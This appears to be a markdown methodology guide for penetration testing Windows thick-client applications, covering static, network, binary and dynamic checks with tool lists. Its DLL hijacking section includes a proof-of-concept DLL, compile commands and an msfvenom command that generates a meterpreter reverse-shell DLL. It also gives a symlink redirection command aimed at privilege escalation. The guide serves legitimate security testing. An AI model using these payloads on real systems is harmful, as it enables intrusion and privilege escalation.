![[thick.gif]]

# Labs

* [DVTA](https://github.com/srini0x00/dvta)
* [DVJA]](https://github.com/appsecco/dvja)
* [BetaFast](https://github.com/NetSPI/BetaFast)
* [AVT](https://github.com/diljith369/AVT)

# Vulnerability Assessment

- https://iammohitmaurya.medium.com/thick-client-application-vapt-8f2e0fc2f92d

# To Know

**Thin Client**

> Connects to a server-based environment that hosts the majority of applications, memory, and sensitive data the user needs.

**Thick Client**

> A thick client is a software that does not need a connection to a server system to operate. Microsoft Outlook, Yahoo Messenger, and Skype are some thick client application examples.

**One-Tier Architecture**

> One-tier architecture involves putting all the required components for a software application or technology on a single server or platform.

**Two-Tier Architecture**

> The two-tier is based on Client-Server architecture. Direct communication takes place between the two. There is no intermediate between client and server.

**Three-Tier Architecture**

> **Recommended architecture** Three-tier architecture is a well-established software application architecture that organizes applications into three logical and physical computing tiers:
>
> * the presentation tier, or user interface;
> * the application tier, where data is processed;
> * the data tier, where the data associated with the application is stored and managed

# Static Analysis

## Information Gathering

Collect the information given below about the application :

* Application Architecture (1Tier, 2Tier, 3Tier ?)
* Platform Mapping
* Languages and Frameworks
* **Tools :**
  * [CFF Explorer](https://ntcore.com/?page\_id=388)
  * [PEid](https://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/PEiD-updated.shtml)
  * [Detect It Easy](https://github.com/horsicq/Detect-It-Easy)
  * [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/) (from sysinternals)

## Signature Check

**Are the .exe and .dll files digitally signed ?**

* **Tools :**
  * sigcheck64.exe (from SysInternals)

```powershell
sigcheck64.exe {application.exe/.dll}
```

If the file is signed, check for its certificate validity :

```powershell
{executable} → Properties → Digital Signatures → Details → (General) View Certificate
```

## Security Features

Are ASLR, DEP & CFG enabled on all DLL's and EXE files ?

* **ASLR** (Address space layout randomization) — When ASLR flag is enabled it prevents attacker from reading/exploiting the incorrect address space locations in the memory.
* **DEP** (Data Execution Prevention) — When DEP flag is enabled it Prevents code execution from data-only memory pages such as the heap and stacks. It separates executable and non-executable memory space. When it finds malicious executable data under non-executable memory space, it terminates the execution of malicious code placed by hacker.
* **CFG** (Control Flow Guard) — Generally programs are executed in predefined order flow. If CFG flag is not enabled then attacker can change the program execution flow and make his malicious code execute.
* **Authenticode** - Assemblies can be protected by signing. If left unsigned, an attacker is able to modify and replace them with malicious content. **SafeSEH** - A list of safe exception handlers is stored within a binary, preventing an attacker from forcing the application to execute code during a call to a malicious exception.
* **HighEntropyVA** - A 64 bit application uses ASLR.
* **RFG** (Return Flow Guard) - Protects against malicious modification of indirect call function pointers.
* **Force Integrity** - Policy that ensures a binary that is being loaded is signed prior to loading.
* **GS** (security cookie) - Binaries with GS enabled have additional protections against stack-based buffer-overflows.
* **NX** - Binaries with NX support can be run with hardware-enforced memory permissions (i.e. hardware DEP).
* **Isolation** - Binaries with isolation support cause the Windows loader to perform a manifest lookup on program load.
* **.NET** - .NET binaries run in a managed environment with many default mitigations.

### PESecurity

- https://github.com/NetSPI/PESecurity

```powershell
# Open PowerShell as administrator :
Set-ExecutionPolicy Unrestricted

# Unzip PESecurity and open PowerShell from the same unzipped folder
Import-Module .\Get-PESecurity.psm1

# Check if these security features are enabled :
Get-PESecurity -directory “{path_of_the_client}” -recursive | Export-CSV file.csv

# Check single file :
Get-PESecurity -file {path_of_the_client_app}
```

### WinCheckSec (complete)

- https://github.com/trailofbits/winchecksec

- Install Release package, unzip

```bash
cd windows.x64.Release\build\Release
.\winchecksec.exe {executable}
```

## Improper File & Folder Permissions

_When the thick client application is installed the majority of times files and folders are more permissive than required. Attacker can use these excessive files and folders permissions to perform malicious activities. Even these excessive permissions leads to DLL hijacking attack._

* **Tools :**
  * **AccessEnum** (from sysinternals) → “_options_” → “_File display options_” → “_Display files with permissions that differ from parent_” → Input the folder path into AccessEnum
  * **Windows Explorer** → Properties of directory → Permissions
* Example :
  * [https://abhigowdaa.medium.com/improper-file-folder-permissions-ada4f2215b80](https://abhigowdaa.medium.com/improper-file-folder-permissions-ada4f2215b80)

### SymLink Attack

Symbolic links or soft links act as a pointer to files or folders located elsewhere in the system. The symbolic link looks like regular files or directories, but when executed by the user or an application, they point to the target files or directories.

For instance, if the application creates a folder 'Log' and inside this folder, it creates a file named App.log. The Log folder permissions are poorly configured as all authenticated users are provided with complete control of this log folder.

* Test for permissions with :

```powershell
icacls.exe {path_of_the_folder}
```

* Create a symlink using the tool createsymlink.exe from Google :

```powershell
CreateSymlink.exe -p "C:\ProgramData\App\Log\App.log" "C:\Windows\1.txt"
```

**As an administrator user, launch the application**. Observe that 1.txt is created inside the Windows folder. All the logs will now be written to the 1.txt file instead of the C:\ProgramData\App\Log\App.log file. The low-privileged user successfully writes content into any file and folders inside Windows, thus leading to DoS and privilege escalation.

## Open known vulnerable Services/Components

* Are unused ports closed ?
* Check **config files** for vulnerable components and their versions

```bash
nmap -sV -v --top-ports 30 {target}
```

* Example :
  * [https://abhigowdaa.medium.com/using-components-with-known-vulnerabilities-b2c90378892e](https://abhigowdaa.medium.com/using-components-with-known-vulnerabilities-b2c90378892e)

# Network Analysis

* **Analyze network packets :**
  * Do sensitive data transmit in GET method request ?
* **Insecure communications :**
  * Test SSL/TLS usage : check if the request generated by the application is in clear text format while being transmitted over the network layer.
* **Tools :**
  * [TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/), from sysinternals
  * [WireShark](https://www.wireshark.org/download.html)
  * [echomirage](https://sourceforge.net/projects/echomirage.oldbutgold.p/)
  * [Microsoft Network Monitor 3.4](https://www.microsoft.com/en-us/download/4865)

# Binary Analysis

## Lack of code obfuscation

* Is the code obfuscated ? Try to decompile it and make modification in the code
* **Tools :**
  * [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)
  * [dnSpy](https://github.com/dnSpy/dnSpy/releases)
  * [ILSpy](https://github.com/icsharpcode/ILSpy)
  * [JDGUI](http://java-decompiler.github.io/)

### Deobfuscation

* **Tools :**
  * [.NET Deobfuscator](https://github.com/NotPrab/.NET-Deobfuscator)
  * [de4dot.exe -installer](https://github.com/Robert-McGinley/de4dot-Installer)

```powershell
# Detect obfuscator
de4dot -d -r c:\{executable_name}
# Find all obfuscated files and deobfuscate them : 
de4dot -r c:\input -ru -ro c:\output
```

## Information Leakage

* Is it there any hardcoded sensitive data in the code ?
* Check **config files** and other sensitive files for potential sensitive details
* **Tools :**
  * strings.exe
  * [hexdump](https://sourceforge.net/projects/hexdump/)
  * [dnSpy](https://github.com/dnSpy/dnSpy/releases)

```powershell
strings.exe {executable_name}
```

**Examples :**

* [https://abhigowdaa.medium.com/thick-client-security-sensitive-info-in-memory-f3c9dbbdca51](https://abhigowdaa.medium.com/thick-client-security-sensitive-info-in-memory-f3c9dbbdca51)
* [https://abhigowdaa.medium.com/sensitive-information-in-hexdump-bb6a6306532c](https://abhigowdaa.medium.com/sensitive-information-in-hexdump-bb6a6306532c)

## Unquoted Service Paths

> When a service is created whose executable path contains spaces and isn't enclosed within quotes, it leads to Unquoted Service Path vulnerability, which allows an attacker to gain elevated privileges.

```powershell
# Scan for any potentially misconfigured services :
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

**Example :**

* [https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)

# Code Analysis

After successfully decompiling the binary, use a source code analyzer.

**Look for :**

* Presence of dead code or test data in release build
* Hard-coded credentials
* API Keys
* API Endpoints
* Comments
* Hidden functions
* Debugging
* **Tools :**
  * [SonarQube](https://bitnami.com/stack/sonarqube/virtual-machine) (static analysis)
  * [VisualCodeGrepper](https://github.com/nccgroup/VCG)

# Dynamic Analysis

* Input Validation
* File Upload
* Buffer Overflow
* Business logic
* DLL Hijacking
* Improper error handling
* Broken authentication & Session management
* Log forging
* Try connecting directly to URLs via the web browser

## Intercept Thick Client App (Proxy)

#### Proxy-Aware Thick Client Apps

* Proxy-aware thick client applications have a built-in feature to set up a Proxy Server.
* Intercepting the traffic is straightforward and easier.
* **Tools :**
  * Burp Suite
  * [Charles Proxy](https://www.charlesproxy.com/download/)

### Proxy-Unaware Thick Client Apps

Proxy-Unaware Thick Client Applications doesn’t have any feature to set up a Proxy server.

* Intercepting request and response can be a little challenging.
* **Two types of tools can be used in this scenario:**
  * Tools that interact with the application process : Echo Mirage, Java snoop.
  * Tools that can intercept HTTP request and response : Burp Suite, Mallory, etc.

## Input Validation

This phase involves tests for injection attacks, like SQL injection, Command injection, LDAP injection, etc. These are similar to the standard OWASP tests for a web application

* **Tools :**
  * [Echo Mirage](https://sourceforge.net/projects/echomirage.oldbutgold.p/) (to change the queries as they were sent directly to the server + the application’s poor input validation to manipulate the queries as a standard SQL injection attack)
  * Burp Suite

### Buffer Overflow

Can be tested by injecting large random values in the input fields.

**Pattern generator :** [https://wiremask.eu/tools/buffer-overflow-pattern-generator/](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

## DLL Hijacking

> DLL Hijacking is a way for attackers to execute malicious code on the system. This means that if an attacker can place a file on the system, that file could be executed when the user runs an application vulnerable to DLL Hijacking. If the application looks for some DLL files that are not present in the location during the runtime, then an attacker can place a malicious DLL file with the same name in that location and escalate the privilege.

**When the thick client application tries to load a DLL, it will go through the following in order:**

* The directory from which the application is loaded
* C:\Windows\System32
* C:\Windows\System
* C:\Windows
* The current working directory
* Directories in the system PATH environment variable
* Directories in the user PATH environment variable

**To be able to escalate privileges via DLL hijacking, the following conditions need to be in place**:

* Write Permissions on a system folder.
* Software installation in a non-default directory.
* A service that is running as a system and is missing a DLL.
* Permissions for restarting the service.
* Tools :
  * procmon.exe (SysInternals)
  * [DLLSpy](https://github.com/cyberark/DLLSpy)
  * [Robber](https://github.com/MojtabaTajik/Robber)

#### Using procmon.exe

Find vulnerable DLLs To enumerate missing DLLs inside a specific executable, set filter like:

```
“Process Name” “contains” “{executable-name}”
```

Apply it and capture events for that specific Executable.

**Simple PoC**

* Find process that runs with other privileges that is missing a DLL.
* Have write permission on any folder where DLL is going to be searched.
* Check permissions in a folder :

```powershell
icacls “{path}”
```

* Creating a payload :

```powershell
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 MessageBox(NULL, TEXT("pwnd!"), TEXT("dll hijack poc!"), 0);
 return 0;
}
```

* Compile on Linux :

```powershell
#install mingw
 sudo apt install mingw-w64
#x32
 i686-w64-mingw32-gcc -shared -o Shared.DLL Shared.cpp
#x64
 x86_64-w64-mingw32-gcc -shared -o Shared.DLL Shared.cpp
```

Place it into folder

**Escalating Privileges**

* Generating Malicious DLL using Metasploit

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil.dll
```

This will generate a Malicious DLL named **evil.dll**. You can **RENAME** it with the targeted DLL name and check if you’re able to get a meterpreter shell.

**Examples :**

* [https://abhigowdaa.medium.com/reverse-shell-using-dll-hijacking-vulnerability-8030eb74290](https://abhigowdaa.medium.com/reverse-shell-using-dll-hijacking-vulnerability-8030eb74290)
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)

## Server-Side Testing

#### Improper Error Handling

* Is there any errors displayed ?
* What information is reported back to the user ?

### Registry Monitoring

Some applications store usernames, passwords, or other sensitive information in the windows registry.

* **Tools :**
  * [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/), from Sysinternals (to check the application operations)

### Log Forging

If the application is maintaining logs then attempt to tamper log entries with malicious out-of-band payloads, spoof data, append large data to file, etc.

* Change the current time to any random value of the past or future and check if the logs recorded by the application reflect the modified value of time and date.
* **Tools :**
  * Echo Mirage
  * Burp Suite (as a web proxy)
  * **Non HTTP Apps**
    * TCP Relay
    * Wireshark
    * Java Snoop

### Try connecting directly to the server

Once you find the server’s IP address then try to directly connect to it and interact. If successful then we have bypassed validations and constraints enforced by the thick client application.

### Layer 7 Attacks

* Injections
  * SQLi
  * LDAP
  * XML
  * OS

## Client-Side Testing

### GUI Attack

> Several users can access the thick-client application with different privileges. Low-privileged users might not be able to use some features of the user interface designed for administrators. For example, an attacker can activate some hidden features that are not available for the current user.

* **Checklist**
  * Display hidden form object
  * Try to activate disabled functionalities
  * Try to uncover the masked password
  * Bypass controls by utilizing intended GUI functionality
* **Tools :**
  * [WinSpy++](https://www.softpedia.com/get/Programming/Other-Programming-Files/WinSpyPlusPlus.shtml)
  * [Windows Detective](https://windowdetective.sourceforge.io/index.html)
  * [SnoopWPF](https://github.com/snoopwpf/snoopwpf)

**Example :**

* [https://www.netspi.com/blog/technical/thick-application-penetration-testing/introduction-to-hacking-thick-clients-part-1-the-gui/](https://www.netspi.com/blog/technical/thick-application-penetration-testing/introduction-to-hacking-thick-clients-part-1-the-gui/)

## Memory Analysis

> Attackers can gain access to memory values if they compromise a system. In addition to analyzing memory, there are many more problems if an attacker has compromised the system. It is essential that applications are responsible for their security to the extent possible and not rely on the security of the system upon which they run.
>
> _As per CWE-316, the sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the application crashes, or if the programmer does not properly clear the memory before freeing it. It could be argued that such problems are usually only exploitable by those with administrator privileges. However, swapping could cause the memory to be written to disk and leave it accessible to physical attack afterwards. Core dump files might have insecure permissions or be stored in archive files that are accessible to non authorized people. Or, uncleared sensitive memory might be inadvertently exposed to attackers due to another weakness._

### Checklist

* Check for sensitive data stored in memory
  * Task Manager > Select Application > "Create dump file"
* Try for memory manipulation : bypass authentication, bypass authorization
* Use breakpoints to test each and every functionality
* **Tools :**
  * [Process Hacker](https://processhacker.sourceforge.io/downloads.php)
  * [Winhex](https://www.x-ways.net/winhex/index-f.html)
  * [Volatility](https://www.volatilityfoundation.org/releases)
